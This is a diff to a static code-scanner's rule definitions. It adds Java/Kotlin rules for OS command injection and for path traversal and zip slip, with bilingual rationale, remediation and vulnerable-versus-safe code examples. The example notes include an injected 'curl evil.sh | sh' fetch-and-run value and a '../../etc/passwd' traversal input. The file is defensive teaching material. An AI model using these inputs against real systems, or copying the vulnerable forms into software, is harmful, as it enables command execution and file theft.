@@ -302,6 +302,40 @@ export const SOURCE_RULES = [
     ],
   },
   {
+    id: "PG-CMD-003",
+    title:
+      "OS command built from dynamic strings in Java/Kotlin (Runtime.exec, ProcessBuilder, Commons Exec)",
+    category: "command_execution",
+    defaultSeverity: "high",
+    scope: "code",
+    languages: ["java", "kotlin"],
+    standards: { owasp: ["A05:2025"], cwe: ["CWE-78"], cert: [{ kind: "direct", id: "IDS07-J" }] },
+    rationale: {
+      en: 'Request data (a Spring `@RequestParam`, `request.getParameter()`, a Ktor `call.parameters` value) in the string for `Runtime.exec(String)`, in the script of `sh -c`, `bash -c` or `cmd /c`, or in `CommandLine.parse(...)` lets an attacker append commands with `;`, `&&` or `$(...)` and run them as the server. In a fixed program\'s argument list (`new ProcessBuilder("git", "log", ref)`) there is no shell, but a value like `--output=out.txt` is still read as an option (argument injection).',
+      ko: '요청 데이터(Spring `@RequestParam`, `request.getParameter()`, Ktor `call.parameters` 값)가 `Runtime.exec(String)`에 넘기는 명령 문자열, `sh -c`·`bash -c`·`cmd /c`·`powershell -Command`의 스크립트, `CommandLine.parse(...)`에 들어가면 공격자가 `;`, `&&`, `$(...)`로 명령을 덧붙여 서버의 권한으로 실행시킬 수 있습니다. 프로그램이 고정된 인자 목록(`new ProcessBuilder("git", "log", ref)`)에서는 셸이 없지만, `--output=out.txt` 같은 값이 옵션으로 해석됩니다(인자 주입).',
+    },
+    remediation: {
+      en: 'Do not build a command string. Call the program directly with a fixed name and one argument per value: `new ProcessBuilder("git", "log", "--end-of-options", ref, "--")`, `Runtime.exec(String[])`, `CommandLine.addArgument(value)`; never `sh -c` with input. Check each argument against an allowlist and mark where options end (`--end-of-options` for git 2.24+, or `--`) so a user value is not read as an option. A Java library (zip, image scaling, DNS) avoids the process altogether.',
+      ko: '명령 문자열을 만들지 마세요. 고정된 프로그램 이름과 값마다 하나의 인자로 직접 호출합니다: `new ProcessBuilder("git", "log", "--end-of-options", ref, "--")`, `Runtime.exec(String[])`, `CommandLine.addArgument(value)`. 입력을 넣은 `sh -c`는 쓰지 마세요. 인자는 허용 목록(allowlist)으로 검증하고, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 또는 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요. 압축, 이미지 축소, DNS 조회 같은 작업은 Java 라이브러리를 쓰면 프로세스 실행 자체를 피할 수 있습니다.',
+    },
+    examples: [
+      {
+        language: "java",
+        vulnerable: 'Runtime.getRuntime().exec("ping -c 1 " + host);',
+        safe: 'if (!host.matches("[A-Za-z0-9.-]+")) throw new IllegalArgumentException("host");\nnew ProcessBuilder("ping", "-c", "1", host).start();',
+        note: {
+          en: "`host` set to `x; curl evil.sh | sh` runs the second command in the first form; the second form passes it to `ping` as one argument.",
+          ko: "`host`가 `x; curl evil.sh | sh`이면 첫 번째 코드는 두 번째 명령까지 실행하고, 두 번째 코드는 값 전체를 `ping`의 인자 하나로만 넘깁니다.",
+        },
+      },
+      {
+        language: "kotlin",
+        vulnerable: 'ProcessBuilder("sh", "-c", "convert $file out.png").start()',
+        safe: 'ProcessBuilder("convert", "--", file, "out.png").start()',
+      },
+    ],
+  },
+  {
     id: "PG-PATH-001",
     title: "File path from request input used in file read/download",
     category: "file_handling",
@@ -322,6 +356,41 @@ export const SOURCE_RULES = [
         language: "javascript",
         vulnerable: "res.sendFile(path.join(UPLOADS, req.query.name));",
         safe: "// once, at startup: const UPLOADS = path.resolve('uploads');\nconst file = path.resolve(UPLOADS, path.basename(req.query.name));\nif (!file.startsWith(UPLOADS + path.sep)) return res.sendStatus(400);\nres.sendFile(file);",
+      },
+    ],
+  },
+  {
+    id: "PG-PATH-002",
+    title:
+      "File path from request input or an archive entry used in Java/Kotlin file access (path traversal, zip slip)",
+    category: "file_handling",
+    defaultSeverity: "high",
+    scope: "code",
+    languages: ["java", "kotlin"],
+    standards: { owasp: ["A01:2025"], cwe: ["CWE-22"], cert: [{ kind: "direct", id: "FIO16-J" }] },
+    rationale: {
+      en: "Using request data (`@RequestParam`, `request.getParameter()`, `MultipartFile.getOriginalFilename()`, a Ktor `call.parameters` value) or `ZipEntry.getName()` as part of a path in `new File(...)`, `Paths.get(...)`, `Path.resolve(...)`, `Files.*` or `FileInputStream` lets an attacker send `../../etc/passwd` to read, overwrite or delete files outside the intended directory. An archive entry named `../../app/run.sh` does the same when it is extracted (zip slip).",
+      ko: "요청 데이터(`@RequestParam`, `request.getParameter()`, `MultipartFile.getOriginalFilename()`, Ktor `call.parameters` 값)나 `ZipEntry.getName()`을 `new File(...)`, `Paths.get(...)`, `Path.resolve(...)`, `Files.*`, `FileInputStream`의 경로 일부로 쓰면 공격자가 `../../etc/passwd`를 보내 의도한 디렉터리 밖의 파일을 읽거나 덮어쓰거나 지울 수 있습니다. 압축 파일 항목 이름이 `../../app/run.sh`이면 압축을 풀 때 같은 일이 일어납니다(zip slip).",
+    },
+    remediation: {
+      en: "Prefer an id looked up in a table over a file name. Otherwise resolve the input against a fixed base, canonicalize it and check the prefix before using it: `Path p = base.resolve(name).normalize(); if (!p.startsWith(base)) throw ...;` (with `base` already normalized, or use `toRealPath()` to resolve links). `FilenameUtils.getName(name)` or `Paths.get(name).getFileName()` keeps only the last element, but check that it is not `..`. Do the same check on every archive entry name before writing it.",
+      ko: "파일 이름 대신 표에서 찾는 id를 쓰는 편이 좋습니다. 그렇지 않다면 입력을 고정된 기준 디렉터리에 대해 해석하고 정규화한 뒤, 사용하기 전에 접두사를 검사하세요: `Path p = base.resolve(name).normalize(); if (!p.startsWith(base)) throw ...;` (`base`는 미리 정규화해 두거나, 링크까지 풀려면 `toRealPath()`를 사용). `FilenameUtils.getName(name)`이나 `Paths.get(name).getFileName()`은 마지막 요소만 남기지만 그 값이 `..`이 아닌지 확인하세요. 압축 파일의 모든 항목 이름도 쓰기 전에 같은 방식으로 검사하세요.",
+    },
+    examples: [
+      {
+        language: "java",
+        vulnerable: 'Files.readAllBytes(Paths.get("/srv/files", name));',
+        safe: 'Path p = BASE.resolve(name).normalize();\nif (!p.startsWith(BASE)) throw new SecurityException("path");\nFiles.readAllBytes(p);',
+        note: {
+          en: "`name` set to `../../etc/passwd` reads `/etc/passwd` in the first form; the second form rejects it.",
+          ko: "`name`이 `../../etc/passwd`이면 첫 번째 코드는 `/etc/passwd`를 읽고, 두 번째 코드는 거부합니다.",
+        },
+      },
+      {
+        language: "java",
+        vulnerable:
+          "File out = new File(dest, entry.getName());\ntry (var fos = new FileOutputStream(out)) { zis.transferTo(fos); }",
+        safe: 'File out = new File(dest, entry.getName());\nif (!out.getCanonicalPath().startsWith(dest.getCanonicalPath() + File.separator)) {\n  throw new IOException("zip slip");\n}\ntry (var fos = new FileOutputStream(out)) { zis.transferTo(fos); }',
       },
     ],
   },
@@ -518,7 +587,10 @@ export const GO_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
 
 export const VUE_RULE_IDS: SourceRuleId[] = ["PG-XSS-003"];
 
-/** Rules that run on Java and Kotlin sources (and on MyBatis mapper XML). */
+/** The rule that runs on MyBatis mapper XML (the other JVM rules read Java and Kotlin only). */
+export const MYBATIS_RULE_IDS: SourceRuleId[] = ["PG-SQL-005"];
+
+/** Rules that run on Java and Kotlin sources. */
 export const JVM_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
   rule.languages.some((language: RuleLanguage) => language === "java" || language === "kotlin"),
 ).map((rule) => rule.id);
